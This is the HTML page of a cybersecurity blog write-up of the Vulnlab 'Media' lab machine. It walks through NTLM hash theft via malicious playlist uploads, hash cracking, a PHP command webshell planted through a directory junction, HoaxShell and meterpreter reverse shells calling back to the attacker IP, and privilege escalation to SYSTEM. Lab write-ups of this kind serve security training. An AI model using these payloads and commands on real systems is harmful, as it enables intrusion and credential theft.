@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Initial ReconnaissanceInitial port scan revealed the following open ports: 1234PORT     STATE SERVICE       REASON          VERSION22&#x2F;tcp   open  ssh           syn-ack ttl 127 OpenSSH 80&#x2F;tcp   open  h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Media">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/04/04/VL-Media/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Initial ReconnaissanceInitial port scan revealed the following open ports: 1234PORT     STATE SERVICE       REASON          VERSION22&#x2F;tcp   open  ssh           syn-ack ttl 127 OpenSSH 80&#x2F;tcp   open  h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/media_player.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/ntlm_hash.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/cracked_hash.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/file_made.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/shell_in_website.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/hoaxshell.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/seimpersonate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Media/systemshell.png">
+<meta property="article:published_time" content="2025-04-04T01:40:52.000Z">
+<meta property="article:modified_time" content="2025-04-03T22:43:39.212Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Media/media_player.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Media</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/02/VL-Job/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/04/VL-Media/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&text=VL-Media"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&is_video=false&description=VL-Media"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Media&body=Check out this article: https://panosoikogr.github.io/2025/04/04/VL-Media/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&name=VL-Media&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/04/VL-Media/&t=VL-Media"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">2.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Theft-Technique"><span class="toc-number">2.1.</span> <span class="toc-text">NTLM Theft Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">2.2.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">3.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Research"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation Research</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Path-Traversal-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Path Traversal Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-a-Webshell"><span class="toc-number">5.1.</span> <span class="toc-text">Creating a Webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-System-Access"><span class="toc-number">6.</span> <span class="toc-text">Gaining System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Media
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-04T01:40:52.000Z" class="dt-published" itemprop="datePublished">2025-04-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Initial port scan revealed the following open ports:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">22/tcp   open  ssh           syn-ack ttl 127 OpenSSH </span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Apache httpd </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/media_player.png" alt="Windows Media Player Upload Interface"></p>
+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>The target website featured an upload function requesting a “brief introduction video (compatible with Windows Media Player)”. This presented an opportunity to leverage NTLM hash theft.</p>
+<h3 id="NTLM-Theft-Technique"><a href="#NTLM-Theft-Technique" class="headerlink" title="NTLM Theft Technique"></a>NTLM Theft Technique</h3><p>Using <a target="_blank" rel="noopener" href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a> to create malicious media files:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- .wax - via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .asx – via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)</span><br></pre></td></tr></table></figure>
+<p>I uploaded a <code>.wax</code> or <code>.asx</code> file to the target and set up Responder to capture the NTLM hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/ntlm_hash.png" alt="NTLM Hash Captured"></p>
+<h3 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h3><p>Once I captured the hash, I used hashcat to crack it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash6969.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: </p>
+<ul>
+<li>Username: ENOX</li>
+<li>Password: &lt;&gt;</li>
+</ul>
+<h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>With the credentials, I established an SSH connection:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh enox@10.10.109.139</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation-Research"><a href="#Privilege-Escalation-Research" class="headerlink" title="Privilege Escalation Research"></a>Privilege Escalation Research</h2><p>Upon accessing the system, I discovered a PowerShell script that revealed key information about the system’s operation:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">enox@MEDIA C:\Users\enox\Documents&gt;type review.ps1</span><br><span class="line">function Get-Values &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Read the first line of the file</span><br><span class="line">    $firstLine = Get-Content $FilePath -TotalCount 1</span><br><span class="line"></span><br><span class="line">    # Extract the values from the first line</span><br><span class="line">    if ($firstLine -match &#x27;Filename: (.+), Random Variable: (.+)&#x27;) &#123;</span><br><span class="line">        $filename = $Matches[1]</span><br><span class="line">        $randomVariable = $Matches[2]</span><br><span class="line"></span><br><span class="line">        # Create a custom object with the extracted values</span><br><span class="line">        $repoValues = [PSCustomObject]@&#123;</span><br><span class="line">            FileName = $filename</span><br><span class="line">            RandomVariable = $randomVariable</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Return the custom object</span><br><span class="line">        return $repoValues</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        # Return $null if the pattern is not found</span><br><span class="line">        return $null</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function UpdateTodo &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Create a .NET stream reader and writer</span><br><span class="line">    $reader = [System.IO.StreamReader]::new($FilePath)</span><br><span class="line">    $writer = [System.IO.StreamWriter]::new($FilePath + &quot;.tmp&quot;)</span><br><span class="line"></span><br><span class="line">    # Read the first line and ignore it</span><br><span class="line">    $reader.ReadLine() | Out-Null</span><br><span class="line"></span><br><span class="line">    # Copy the remaining lines to a temporary file</span><br><span class="line">    while (-not $reader.EndOfStream) &#123;</span><br><span class="line">        $line = $reader.ReadLine()</span><br><span class="line">        $writer.WriteLine($line)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Close the reader and writer</span><br><span class="line">    $reader.Close()</span><br><span class="line">    $writer.Close()</span><br><span class="line"></span><br><span class="line">    # Replace the original file with the temporary file</span><br><span class="line">    Remove-Item $FilePath</span><br><span class="line">    Rename-Item -Path ($FilePath + &quot;.tmp&quot;) -NewName $FilePath</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$todofile=&quot;C:\\Windows\\Tasks\\Uploads\\todo.txt&quot;</span><br><span class="line">$mediaPlayerPath = &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while($True)&#123;</span><br><span class="line"></span><br><span class="line">    if ((Get-Content -Path $todofile) -eq $null) &#123;</span><br><span class="line">        Write-Host &quot;Todo is empty.&quot;</span><br><span class="line">        Sleep 60 # Sleep for 60 seconds before rechecking</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $result = Get-Values -FilePath $todofile</span><br><span class="line">        $filename = $result.FileName</span><br><span class="line">        $randomVariable = $result.RandomVariable</span><br><span class="line">        Write-Host &quot;FileName: $filename&quot;</span><br><span class="line">        Write-Host &quot;Random Variable: $randomVariable&quot;</span><br><span class="line"></span><br><span class="line">        # Opening the File in Windows Media Player</span><br><span class="line">        Start-Process -FilePath $mediaPlayerPath -ArgumentList &quot;C:\Windows\Tasks\uploads\$randomVariable\$filename&quot;</span><br><span class="line"></span><br><span class="line">        # Wait for 15 seconds</span><br><span class="line">        Start-Sleep -Seconds 15</span><br><span class="line"></span><br><span class="line">        $mediaPlayerProcess = Get-Process -Name &quot;wmplayer&quot; -ErrorAction SilentlyContinue</span><br><span class="line">        if ($mediaPlayerProcess -ne $null) &#123;</span><br><span class="line">            Write-Host &quot;Killing Windows Media Player process.&quot;</span><br><span class="line">            Stop-Process -Name &quot;wmplayer&quot; -Force</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Task Done</span><br><span class="line">        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt</span><br><span class="line">        Sleep 15</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Path-Traversal-Exploitation"><a href="#Path-Traversal-Exploitation" class="headerlink" title="Path Traversal Exploitation"></a>Path Traversal Exploitation</h2><p>I discovered a junction abuse vulnerability in the <code>C:\Windows\Tasks\Uploads\</code> directory. The system creates MD5 hashes from the “firstnamelastnameemail” of data input to the website during uploads.</p>
+<h3 id="Creating-a-Webshell"><a href="#Creating-a-Webshell" class="headerlink" title="Creating a Webshell"></a>Creating a Webshell</h3><p>First, I created a simple PHP webshell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">system($_REQUEST[&#x27;cmd&#x27;]);  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>I then calculated the MD5 hash that would be created:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;carlitocarlitocarlito@media.vl&quot; | md5sum</span><br><span class="line">3aab4336940e9c82d5ef05bf40d58b52  -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/file_made.png" alt="File Created"><br>After verifying the hash calculation worked correctly, I deleted the folder and created a junction pointing to <code>C:\xampp\htdocs</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /J C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52 C:\xampp\htdocs</span><br></pre></td></tr></table></figure>
+<p>After re-uploading the file, the webshell appeared in <code>C:\xampp\htdocs</code>:<br><img src="/images/Media/shell_in_website.png" alt="Shell in Website"></p>
+<h2 id="Gaining-System-Access"><a href="#Gaining-System-Access" class="headerlink" title="Gaining System Access"></a>Gaining System Access</h2><p>I created a HoaxShell session and executed the provided command through our webshell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --p 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpshell.php?cmd=powershell -e ......</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/hoaxshell.png" alt="HoaxShell Connection"><br>I noticed we were running as the Local Service account but without the impersonate privilege. To restore these privileges, I used <a target="_blank" rel="noopener" href="https://github.com/itm4n/FullPowers/releases/tag/v0.1">FullPowers</a>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.8.5.195/FullPowers.exe -o FS.exe</span><br></pre></td></tr></table></figure>
+<p>I then created another HoaxShell and executed FullPowers:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./FS.exe -c &quot;powershell -e .....</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Media/seimpersonate.png" alt="SeImpersonate Privilege"></p>
+<h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p>To escalate to SYSTEM, I used the Meterpreter <code>getsystem</code> command (alternatively, any potato exploit would work):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure>
+<p>Started Metasploit console:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 9091</span><br></pre></td></tr></table></figure>
+<p>After obtaining a system session, I simply ran:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Media/systemshell.png" alt="System Shell"></p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c">https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">2.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Theft-Technique"><span class="toc-number">2.1.</span> <span class="toc-text">NTLM Theft Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">2.2.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">3.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Research"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation Research</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Path-Traversal-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Path Traversal Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-a-Webshell"><span class="toc-number">5.1.</span> <span class="toc-text">Creating a Webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-System-Access"><span class="toc-number">6.</span> <span class="toc-text">Gaining System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/04/VL-Media/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&text=VL-Media"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&is_video=false&description=VL-Media"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Media&body=Check out this article: https://panosoikogr.github.io/2025/04/04/VL-Media/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&title=VL-Media"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/04/VL-Media/&name=VL-Media&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/04/VL-Media/&t=VL-Media"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
